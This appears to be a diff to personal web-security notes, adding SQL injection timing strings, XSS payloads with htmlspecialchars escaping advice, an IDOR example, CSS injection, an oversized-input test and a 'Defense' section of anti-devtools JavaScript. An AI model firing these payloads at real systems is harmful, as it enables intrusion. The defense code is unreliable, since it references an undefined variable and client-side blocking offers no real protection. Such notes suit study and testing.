@@ -87,6 +87,9 @@
 
 ```
 ' OR SLEEP(5) --
+' OR SLEEP(3) --
+' OR SLEEP(10) --
+' OR SLEEP(100000000000) --
 ' OR 1=1 --
 " OR "1"="1"
 admin'--
@@ -102,3 +105,108 @@ admin'/*
 1 OR 1=1--
 1 OR 1=1
 ```
+
+#### IDOR Insecure Direct Object Reference
+
+```text
+name: normal_user
+user: 0@_normalUser_@0
+
+/api/user?id=1 => 2
+/api/data?id=2 => 3
+```
+
+#### XSS (Cross-Site Scripting)
+
+##### htmlspecialchars
+```
+<script>alert(0);</script>
+<img src=x onerror=alert(0)>
+<svg onload=alert(0)>
+<body onload=alert(0)>
+<input autofocus onfocus=alert(0)>
+<a href="javascript:alert(0)">click</a>
+
+// WEAK - default, only escapes < > &
+htmlspecialchars($input)
+
+" onmouseover="alert(1)
+' onmouseover='alert(0)
+
+// WEAK - no charset specified
+htmlspecialchars($input, ENT_QUOTES)
+
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+// CORRECT - escapes ' " < > &
+htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
+```
+
+##### Link
+```
+
+<a href="<?= htmlspecialchars($url, ENT_QUOTES, 'UTF-8') ?>">click</a>
+
+<a href="javascript:alert(1)">click</a>
+
+javascript:alert(1)
+
+$url = $_GET['url'];
+if (!preg_match('/^https?:\/\//', $url)) {
+    $url = '#';
+}
+<a href="<?= htmlspecialchars($url, ENT_QUOTES, 'UTF-8') ?>">click</a>
+```
+
+#### CSS Injection
+
+```
+<style>body{background:red!important}</style>
+```
+
+#### Overflow DB
+````
+spam => A
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+````
+#### brute force
+
+```
+brute force ??????????????/
+```
+
+## Defense (===)
+
+### 1 Cheat
+
+```js
+document.addEventListener("contextmenu", function (event) {
+    event.preventDefault();
+});
+
+document.addEventListener("copy", event => event.preventDefault());
+
+document.addEventListener("keydown", function(event) {
+    if (event.key === "ContextMenu" || (event.shiftKey && event.key === "F10")) {
+        e.preventDefault();
+    }
+
+    if (event.key === "ContextMenu" || (event.shiftKey && event.ctrlKey && event.key === "I")) {
+        e.preventDefault();
+    }
+
+
+    if (event.key === "ContextMenu" || event.key === "F12") {
+        e.preventDefault();
+    }
+
+});
+
+setInterval(() => {
+    if (window.outerWidth - window.innerWidth > 100) {
+        alert("DevTools detected!");
+    }
+}, 1000);
+```
+
